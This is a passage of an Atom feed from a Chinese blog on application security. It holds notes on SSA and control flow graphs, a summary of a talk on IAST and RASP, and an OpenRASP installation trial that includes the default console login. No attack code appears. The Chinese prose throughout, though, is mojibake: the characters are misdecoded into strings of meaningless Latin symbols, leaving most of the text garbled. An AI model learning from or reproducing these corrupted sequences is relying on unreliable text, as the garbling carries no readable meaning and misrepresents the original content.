title="SSA"></a>SSA</h2><p>ä¸€ç§ç‰¹æ®Šçš„ä¸‰åœ°å€ç :</p><ul><li>æ¯æ¬¡èµ‹å€¼æœ‰æ–°çš„å˜é‡å</li><li>æ¯ä¸€ä¸ªå˜é‡éƒ½æœ‰å”¯ä¸€å®šä¹‰</li></ul><p>ä¼˜åŠ¿ï¼š</p><ul><li>flow-insensitive analysisæ›´å‡†ç¡®</li><li>å®¹æ˜“åšä¼˜åŒ–ç®—æ³•</li></ul><p>åŠ£åŠ¿ï¼š</p><ul><li>å¼•å…¥å¤§é‡å˜é‡</li><li>ç¼–è¯‘æ—¶æœ‰æ€§èƒ½é—®é¢˜</li></ul><h1 id="Control-Flow-Graph"><a href="#Control-Flow-Graph" class="headerlink" title="Control Flow Graph"></a>Control Flow Graph</h1><p>Basic Blockæ˜¯CFGçš„ä¸»ä½“ã€‚</p><ul><li>Basic Blockï¼šä¸€ä¸ªæœ€é•¿çš„è¯­å¥åºåˆ—ï¼Œå¹¶ä¿è¯å…¥å£åªèƒ½åœ¨æœ€å¼€å§‹æŒ‡ä»¤ä¸”å‡ºå£åªèƒ½åœ¨æœ€åä¸€ä¸ªæŒ‡ä»¤</li></ul><h2 id="æ„é€ Basic-Blocks"><a href="#æ„é€ Basic-Blocks" class="headerlink" title="æ„é€ Basic Blocks"></a>æ„é€ Basic Blocks</h2><ul><li>Inputï¼šç¨‹åºPçš„ä¸‰åœ°å€ç åºåˆ—</li><li><p>Outputï¼šç¨‹åºPçš„basic blocks</p></li><li><p>ç®—æ³•</p><ol><li><p>ç¡®å®šleadersï¼ˆæ¯ä¸ªbasic blockçš„å¤´ï¼‰</p><ul><li>åºåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤</li><li>è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡æŒ‡ä»¤</li><li>è·³è½¬æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</li><li>returnæŒ‡ä»¤</li></ul></li><li><p>æ¯ä¸ªBasic BlockåŒ…å«å…¶leaderè‡³ä¸‹ä¸€ä¸ªleaderå‰çš„æ‰€æœ‰è¯­å¥</p></li></ol></li></ul><h2 id="æ„é€ CFG"><a href="#æ„é€ CFG" class="headerlink" title="æ„é€ CFG"></a>æ„é€ CFG</h2><ul><li>æ·»åŠ è¾¹ï¼Œåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ï¼š<ul><li>ä»£ç å—å­˜åœ¨å…ˆåé¡ºåºï¼Œä¸”ä¸å­˜åœ¨æ— æ¡ä»¶è·³è½¬</li><li>æ¯ä¸ªè·³è½¬é—´</li></ul></li><li>æ·»åŠ entryå’ŒexitèŠ‚ç‚¹</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ¯æ ¡è®¡ç®—æœºé™¢çš„ææ¨¾ã€è°­æ·»è€å¸ˆè®²çš„è¯¾ï¼Œå¬äº†ç¬¬ä¸€èŠ‚è¯¾å°±å“­äº†ï¼Œå†³å®šåšä¸€ä¸‹ç¬”è®°ï¼Œè¯¾ç¨‹ç½‘ç«™ &lt;a href=&quot;https://pascal-group.bitbucket.io/teaching.htmlã€‚&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pascal-group.bitbucket.io/teaching.htmlã€‚&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;PLçŸ¥è¯†ä½“ç³»&quot;&gt;&lt;a href=&quot;#PLçŸ¥è¯†ä½“ç³»&quot; class=&quot;headerlink&quot; title=&quot;PLçŸ¥è¯†ä½“ç³»&quot;&gt;&lt;/a&gt;PLçŸ¥è¯†ä½“ç³»&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802113608162.png&quot; alt=&quot;image-20200802113608162&quot;&gt;&lt;/p&gt;&lt;p&gt;å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦åˆ†ä¸‰å¤§å—ï¼Œç†è®ºéƒ¨åˆ†åŒ…å«è¯­è¨€è®¾è®¡ã€ç±»å‹ç³»ç»Ÿã€è¯­ä¹‰å’Œé€»è¾‘æ£€æŸ¥ï¼›ç¯å¢ƒéƒ¨åˆ†åŒ…å«ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶è®¾è®¡ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åŒ…å«ç¨‹åºåˆ†æã€ç¨‹åºéªŒè¯å’Œç¨‹åºç”Ÿæˆç­‰ï¼Œæœ¬è¯¾ç¨‹ä¸»è¦å…³æ³¨äºåº”ç”¨æ–¹é¢çš„ç¨‹åºåˆ†æã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•</title>
    <link href="http://anemone.top/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <id>http://anemone.top/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/</id>
    <published>2020-06-14T08:21:52.000Z</published>
    <updated>2020-06-14T09:12:54.574Z</updated>
    
    <content type="html"><![CDATA[<p>æ‚¬é•œçš„ä¸€ä¸ªæŠ€æœ¯åˆ†äº«ä¼šï¼Œå¤§è‡´è®²äº†ä¸‰ç§IASTçš„å®ç°ï¼Œè¿™é‡Œåšä¸€ä¸ªç¬”è®°æ€»ç»“ã€‚</p><h1 id="IASTç®€ä»‹"><a href="#IASTç®€ä»‹" class="headerlink" title="IASTç®€ä»‹"></a>IASTç®€ä»‹</h1><p>IAST (Interactive Application Security Testing) ä¹Ÿå«ç°ç›’æµ‹è¯•ï¼Œå³ä»‹äºç™½ç›’å’Œé»‘ç›’ä¹‹é—´çš„ä¸€ç§æµ‹è¯•ï¼Œè¿™ä¸€åœºæ™¯ä¸‹çš„æŠ€æœ¯ä¸ä½†å…³æ³¨ç¨‹åºè¾“å…¥è¾“å‡ºä¿¡æ¯ï¼ˆåƒé»‘ç›’ç¨‹åºé‚£æ ·ï¼‰ï¼Œè¿˜å¯ä»¥ï¼ˆæ³¨æ„åªæ˜¯å¯ä»¥ï¼Œåé¢ä¼šç»†è¯´ï¼‰äº†è§£éƒ¨åˆ†ç¨‹åºå†…éƒ¨é€»è¾‘ï¼ˆåƒç™½ç›’æµ‹è¯•é‚£æ ·ï¼‰ã€‚å› æ­¤å…·å¤‡é»‘ç™½ç›’æµ‹è¯•çš„ä¼˜ç‚¹ï¼Œè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä»£å®‰å…¨æ‰«ææŠ€æœ¯ï¼Œè¢«å„ä¸ªè¡Œä¸šæ‰€å…³æ³¨ã€‚è®¸å¤šé»‘ç™½ç›’æµ‹è¯•æŠ€æœ¯ç¨åŠ æ”¹é€ å’Œç»“åˆï¼Œå°±å¯ä»¥å˜ä¸ºç°ç›’æµ‹è¯•æŠ€æœ¯ã€‚</p><a id="more"></a><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/InkedImage-1592125628662_LI.jpg" alt="Image"></p><h2 id="ä¸RASPçš„å…³ç³»"><a href="#ä¸RASPçš„å…³ç³»" class="headerlink" title="ä¸RASPçš„å…³ç³»"></a>ä¸RASPçš„å…³ç³»</h2><p>RASPï¼ˆRuntime Application Self-protectionï¼‰æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹ç¨‹åºè¡Œä¸ºè¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç²¾ç¡®åˆ°å‡½æ•°çº§åˆ«çš„WAFï¼Œä¸ªäººè®¤ä¸ºRASPæ˜¯IASTçš„ä¸€éƒ¨åˆ†ï¼Œä¸¤è€…ä½¿ç”¨çš„æŠ€æœ¯æ˜¯æœ‰é‡å çš„ï¼Œæ¯”å¦‚è¯´åæ–‡æåˆ°çš„åŸºäºæ’æ¡©çš„IASTå®ç°ã€‚</p><h1 id="IASTåˆ†ç±»"><a href="#IASTåˆ†ç±»" class="headerlink" title="IASTåˆ†ç±»"></a>IASTåˆ†ç±»</h1><p>åœ¨å¤§æ–¹å‘ä¸Šï¼Œä¸»è¦æœ‰ä¸¤ç§ï¼Œè€Œåœ¨æ’æ¡©æŠ€æœ¯å®ç°æ—¶åˆä¼šæœ‰åˆ†æ”¯ï¼š</p><ul><li>åŸºäºæµé‡</li><li>åŸºäºæ’æ¡©<ul><li>ä¸»åŠ¨å‹IAST</li><li>è¢«åŠ¨å‹IAST</li></ul></li></ul><h2 id="åŸºäºæµé‡çš„IAST"><a href="#åŸºäºæµé‡çš„IAST" class="headerlink" title="åŸºäºæµé‡çš„IAST"></a>åŸºäºæµé‡çš„IAST</h2><p>åŸºäºæµé‡çš„IASTæ˜¯æŒ‡é€šè¿‡çˆ¬è™«+è¢«åŠ¨å¼é»‘ç›’æ‰«æå™¨å®ç°çš„IASTæŠ€æœ¯ï¼Œæ¯”å¦‚è¯´crawlergo+xrayçš„é…ç½®ï¼Œè¿™ç±»æŠ€æœ¯çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºï¼š</p><ol><li><p>åŸºäºç°æˆæŠ€æœ¯ï¼Œæ”¹é€ ç®€å•</p></li><li><p>ä¸é™è¯­è¨€ï¼ŒæŠ€æœ¯é€šç”¨</p></li><li><p>æ‰«ææŠ¥å‘Šå¯ä»¥ç›´æ¥ç”¨äºæ¼æ´éªŒè¯å’Œåˆ©ç”¨</p></li><li><p>ç›¸è¾ƒäºæ’æ¡©èƒ½æ‰«ææ›´å¤šç±»å‹æ¼æ´ï¼ˆå¦‚BACï¼‰</p></li></ol><h2 id="åŸºäºæ’æ¡©çš„IAST"><a href="#åŸºäºæ’æ¡©çš„IAST" class="headerlink" title="åŸºäºæ’æ¡©çš„IAST"></a>åŸºäºæ’æ¡©çš„IAST</h2><p>åŸºäºæ’æ¡©çš„IASTä¸»è¦æ˜¯åˆ©ç”¨ä»£ç æ’æ¡©æŠ€æœ¯ï¼Œåœ¨ç›®æ ‡åº”ç”¨çš„å…³é”®ç±»ã€æ–¹æ³•ä¸­æ’å…¥æ£€æµ‹é€»è¾‘ï¼Œå¦‚åœ¨Javaä¸­ï¼Œå¯ä»¥ç”¨å­—èŠ‚ç æ“ä½œæ¡†æ¶ï¼ˆå¦‚ï¼šASMã€Javaassistã€Aspectjç­‰ï¼‰ä¿®æ”¹ç±»å’Œæ–¹æ³•ï¼Œé€šè¿‡ç¨‹åºåé¦ˆæ£€æµ‹ç¨‹åºæ¼æ´ï¼Œè¿™ç±»æŠ€æœ¯çš„ä¼˜åŠ¿åœ¨äºï¼š</p><ol><li>æ— éœ€é‡æ”¾ã€æ— è„æ•°æ®</li><li>æ›´é«˜çš„å‡†ç¡®æ€§</li><li>è§£å†³ç­¾åæ ¡éªŒã€é™åˆ¶æ•°æ®é‡æ”¾ç­‰é—®é¢˜</li></ol><h3 id="ä¸»åŠ¨å‹IAST"><a href="#ä¸»åŠ¨å‹IAST" class="headerlink" title="ä¸»åŠ¨å‹IAST"></a>ä¸»åŠ¨å‹IAST</h3><p>ä¸»åŠ¨å‹IASTæ˜¯æŒ‡ä»ç„¶ä¿ç•™é»‘ç›’æ‰«æå™¨ï¼Œåªåœ¨å®‰å…¨æ•æ„Ÿå‡½æ•°ï¼ˆæ±¡ç‚¹åˆ†æä¸­çš„sink ï¼‰ä¸Šæ’æ¡©ï¼Œé€šè¿‡æ£€æµ‹å‡½æ•°å‚æ•°æ˜¯å¦æ˜¯é¢„å®šä¹‰çš„payloadï¼Œæ£€æŸ¥ç¨‹åºæ˜¯å¦æœ‰æ¼æ´ï¼Œå¦‚ä¸‹å›¾ï¼Œagentç«¯å¯ä»¥æ£€æµ‹åˆ°æ‰«æå™¨å‘æ¥çš„payloadå·²ç»ä½œä¸º<code>executeQuery()</code>çš„å‚æ•°ï¼Œå› æ­¤æŠ¥å‘Šæ¼æ´ï¼Œæˆ–æ˜¯æ‹¦æˆªï¼ˆRASPï¼‰ã€‚æ’æ¡©ç¨‹åºå¯ä»¥åŒæ—¶æ‹¿åˆ°è¿”å›å‡½æ•°è°ƒç”¨æ ˆã€ä»£ç è¡Œå·ä»¥åŠè¯·æ±‚æ•°æ®ã€‚</p><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/Image.png" alt="ä¸»åŠ¨å‹IAST"></p><h3 id="è¢«åŠ¨å‹IAST"><a href="#è¢«åŠ¨å‹IAST" class="headerlink" title="è¢«åŠ¨å‹IAST"></a>è¢«åŠ¨å‹IAST</h3><p>è¢«åŠ¨å‹IASTæ˜¯æŒ‡ä½¿ç”¨åŠ¨æ€æ±¡ç‚¹åˆ†ææŠ€æœ¯ï¼Œä¸éœ€è¦æ‰«æç«¯ï¼Œç›´æ¥åˆ¤æ–­æ•æ„Ÿå‚æ•°æ˜¯å¦ä¸ºç”¨æˆ·å¯æ§ã€‚ä¸ªäººè®¤ä¸ºæ˜¯æŠ€æœ¯éš¾åº¦æœ€é«˜çš„ä¸€ç§IASTï¼Œå› ä¸ºæ’æ¡©ç¨‹åºéœ€è¦å®ç°åŠ¨æ€æ±¡ç‚¹åˆ†æé€»è¾‘ï¼Œå®æ—¶ç›‘æ§ç¨‹åºæ±¡ç‚¹æ•°æ®å˜åŒ–ï¼Œæ£€æµ‹æ±¡ç‚¹æ˜¯å¦ç”±sourceä¼ æ’­åˆ°sinkç‚¹ã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé€šè¿‡æ±¡ç‚¹åˆ†æï¼Œç”¨æˆ·äº§ç”Ÿçš„è¾“å…¥å¯ä»¥ç›´æ¥äº§ç”Ÿæ¼æ´æŠ¥å‘Šï¼š</p><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/Image-1592125395631.png" alt="è¢«åŠ¨å‹IAST"></p><p>è¢«åŠ¨å‹IASTçš„å¥½å¤„åœ¨äºå…¶å®Œå…¨ä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡ï¼Œå¹¶ä¸”å¤§å¤§æé«˜æ‰«æè¦†ç›–ç‡ï¼Œç„¶è€Œä¸ªäººè®¤ä¸ºåŠ¨æ€æ±¡ç‚¹ä¼ æ’­ä¹Ÿä¼šæœ‰è¿‡æ±¡æŸ“å’Œæ¬ æ±¡æŸ“é—®é¢˜ï¼Œå¹¶ä¸”å…¶æœ¬èº«å¹¶ä¸èƒ½å¾ˆå¥½çš„å¤„ç†åˆ†æ”¯è¦†ç›–é—®é¢˜ï¼Œå¯ä»¥è¯´åœ¨è¿™ä¸€æ–¹é¢è¿˜å­˜åœ¨ç€è¯¸å¤šæŒ‘æˆ˜ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åˆ†äº«ä¼šå› ä¸ºæœ‰äº›æ¶‰åŠåˆ°æŠ€æœ¯ç»†èŠ‚ï¼Œå¤§ä½¬è¿˜æ˜¯æœ‰æ‰€ä¿ç•™ï¼Œä¸è¿‡å¤§è‡´ç†æ¸…æ¥šäº†IASTçš„ä¸‰å¤§å·¥ä½œæ¨¡å¼å’Œå¯¹åº”çš„æŠ€æœ¯ï¼Œç®—æ˜¯ä¸€æ¬¡ç§‘æ™®æ€§çš„åˆ†äº«ï¼Œæ„Ÿè°¢å®æˆˆå¤§ä½¬ï¼</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‚¬é•œçš„ä¸€ä¸ªæŠ€æœ¯åˆ†äº«ä¼šï¼Œå¤§è‡´è®²äº†ä¸‰ç§IASTçš„å®ç°ï¼Œè¿™é‡Œåšä¸€ä¸ªç¬”è®°æ€»ç»“ã€‚&lt;/p&gt;&lt;h1 id=&quot;IASTç®€ä»‹&quot;&gt;&lt;a href=&quot;#IASTç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;IASTç®€ä»‹&quot;&gt;&lt;/a&gt;IASTç®€ä»‹&lt;/h1&gt;&lt;p&gt;IAST (Interactive Application Security Testing) ä¹Ÿå«ç°ç›’æµ‹è¯•ï¼Œå³ä»‹äºç™½ç›’å’Œé»‘ç›’ä¹‹é—´çš„ä¸€ç§æµ‹è¯•ï¼Œè¿™ä¸€åœºæ™¯ä¸‹çš„æŠ€æœ¯ä¸ä½†å…³æ³¨ç¨‹åºè¾“å…¥è¾“å‡ºä¿¡æ¯ï¼ˆåƒé»‘ç›’ç¨‹åºé‚£æ ·ï¼‰ï¼Œè¿˜å¯ä»¥ï¼ˆæ³¨æ„åªæ˜¯å¯ä»¥ï¼Œåé¢ä¼šç»†è¯´ï¼‰äº†è§£éƒ¨åˆ†ç¨‹åºå†…éƒ¨é€»è¾‘ï¼ˆåƒç™½ç›’æµ‹è¯•é‚£æ ·ï¼‰ã€‚å› æ­¤å…·å¤‡é»‘ç™½ç›’æµ‹è¯•çš„ä¼˜ç‚¹ï¼Œè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä»£å®‰å…¨æ‰«ææŠ€æœ¯ï¼Œè¢«å„ä¸ªè¡Œä¸šæ‰€å…³æ³¨ã€‚è®¸å¤šé»‘ç™½ç›’æµ‹è¯•æŠ€æœ¯ç¨åŠ æ”¹é€ å’Œç»“åˆï¼Œå°±å¯ä»¥å˜ä¸ºç°ç›’æµ‹è¯•æŠ€æœ¯ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASPåˆæ¢</title>
    <link href="http://anemone.top/iast-OpenRASP%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/iast-OpenRASPåˆæ¢/</id>
    <published>2020-06-14T08:17:12.000Z</published>
    <updated>2020-06-29T09:07:15.622Z</updated>
    
    <content type="html"><![CDATA[<p>OpenRASPæ˜¯ä¸€ç§è¾ƒä¸ºæˆç†Ÿçš„RASPæŠ€æœ¯å¼€æºå®ç°ï¼ŒæŠ€æœ¯æ€è·¯ä¸»è¦æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„ä¸»åŠ¨å‹RASPåŸç†ï¼Œè¯¦ç»†å¯ä»¥è§<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals" target="_blank" rel="noopener">hookå‡½æ•°åˆ—è¡¨</a>ï¼ˆå•†ä¸šç‰ˆæœ‰åŠ¨æ€æ±¡ç‚¹è¿½è¸ªï¼‰ï¼Œæœ¬æ–‡ä¸ºè¯•ç”¨æŠ¥å‘Šï¼Œä¹‹åæœ‰æ—¶é—´ä¼šæ·±å…¥çœ‹çœ‹ä»£ç ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="å®‰è£…åå°"><a href="#å®‰è£…åå°" class="headerlink" title="å®‰è£…åå°"></a>å®‰è£…åå°</h2><ol><li><p>å®‰è£…MongoDBå’ŒElasticSearchï¼ˆ5.6~6ï¼‰</p></li><li><p>åœ¨<a href="https://packages.baidu.com/app/openrasp/release/latest/" target="_blank" rel="noopener">https://packages.baidu.com/app/openrasp/release/latest/</a>ä¸‹è½½<code>rasp-cloud.tar.gz</code></p></li><li><p>è§£å‹å¹¶é…ç½®<code>conf/app.conf</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[prod]</span><br><span class="line">EsAddr = http://127.0.0.1:9200</span><br><span class="line">EsUser =</span><br><span class="line">EsPwd =</span><br><span class="line">MongoDBAddr = 127.0.0.1:27017</span><br><span class="line">MongoDBUser =</span><br><span class="line">MongoDBPwd =</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨<code>./rasp-cloud -d</code>ï¼Œç”¨æˆ·åå¯†ç ä¸º<code>openrasp::admin@123</code>ï¼Œåå°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629161638149.png" alt="image-20200629161638149"></p></li></ol><a id="more"></a><h2 id="å®‰è£…agent"><a href="#å®‰è£…agent" class="headerlink" title="å®‰è£…agent"></a>å®‰è£…agent</h2><p>è¿™é‡Œåªä½¿ç”¨Spring Bootçš„ç”¨æ³•ï¼š</p><ol><li><p>åŠè‡ªåŠ¨åŒ–å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar RaspInstall.jar -nodetect -install &lt;project_target&gt;  -heartbeat 90 -appid &lt;id&gt; -appsecret &lt;secret&gt; -backendurl &lt;url&gt;</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯Spring Boot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/mnt/d/java-sec-code/target/rasp/rasp.jar  -jar /mnt/d/java-sec-code/target/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸»æœºä¸Šçº¿ï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629165551559.png" alt="image-20200629165551559"></p></li></ol><h1 id="åŠŸèƒ½ä½¿ç”¨"><a href="#åŠŸèƒ½ä½¿ç”¨" class="headerlink" title="åŠŸèƒ½ä½¿ç”¨"></a>åŠŸèƒ½ä½¿ç”¨</h1><p>ä¸»è¦æ‹¿Java-sec-codeè¯•ç”¨äº†ä¸€ä¸‹ï¼Œæ•ˆæœè¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œé™¤äº†ä¸€ä¸ªPathTraversalæ²¡æ£€æŸ¥å‡ºæ¥ï¼Œå…¶ä»–çš„éƒ½æŸ¥åˆ°äº†ï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629170641757.png" alt="image-20200629170641757"></p><p>è‡³äºé‚£ä¸ªpathtranversalæ²¡æŸ¥å‡ºæ¥çš„é—®é¢˜åé¢å¯ä»¥å†çœ‹ä¸€ä¸‹ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li>OpenRASPå®˜ç½‘ï¼Œ<a href="https://rasp.baidu.com/" target="_blank" rel="noopener">https://rasp.baidu.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OpenRASPæ˜¯ä¸€ç§è¾ƒä¸ºæˆç†Ÿçš„RASPæŠ€æœ¯å¼€æºå®ç°ï¼ŒæŠ€æœ¯æ€è·¯ä¸»è¦æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„ä¸»åŠ¨å‹RASPåŸç†ï¼Œè¯¦ç»†å¯ä»¥è§&lt;a href=&quot;https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hookå‡½æ•°åˆ—è¡¨&lt;/a&gt;ï¼ˆå•†ä¸šç‰ˆæœ‰åŠ¨æ€æ±¡ç‚¹è¿½è¸ªï¼‰ï¼Œæœ¬æ–‡ä¸ºè¯•ç”¨æŠ¥å‘Šï¼Œä¹‹åæœ‰æ—¶é—´ä¼šæ·±å…¥çœ‹çœ‹ä»£ç ã€‚&lt;/p&gt;&lt;h1 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h1&gt;&lt;h2 id=&quot;å®‰è£…åå°&quot;&gt;&lt;a href=&quot;#å®‰è£…åå°&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…åå°&quot;&gt;&lt;/a&gt;å®‰è£…åå°&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å®‰è£…MongoDBå’ŒElasticSearchï¼ˆ5.6~6ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åœ¨&lt;a href=&quot;https://packages.baidu.com/app/openrasp/release/latest/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://packages.baidu.com/app/openrasp/release/latest/&lt;/a&gt;ä¸‹è½½&lt;code&gt;rasp-cloud.tar.gz&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è§£å‹å¹¶é…ç½®&lt;code&gt;conf/app.conf&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[prod]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsAddr = http://127.0.0.1:9200&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsUser =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsPwd =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBAddr = 127.0.0.1:27017&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBUser =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBPwd =&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯åŠ¨&lt;code&gt;./rasp-cloud -d&lt;/code&gt;ï¼Œç”¨æˆ·åå¯†ç ä¸º&lt;code&gt;openrasp::admin@123&lt;/code&gt;ï¼Œåå°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/iast-OpenRASPåˆæ¢/image-20200629161638149.png&quot; alt=&quot;image-20200629161638149&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>Sqreenåˆæ¢</title>
    <link href="http://anemone.top/iast-Sqreen%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/iast-Sqreenåˆæ¢/</id>
    <published>2020-06-04T08:37:37.000Z</published>
    <updated>2020-06-05T03:06:12.004Z</updated>
    
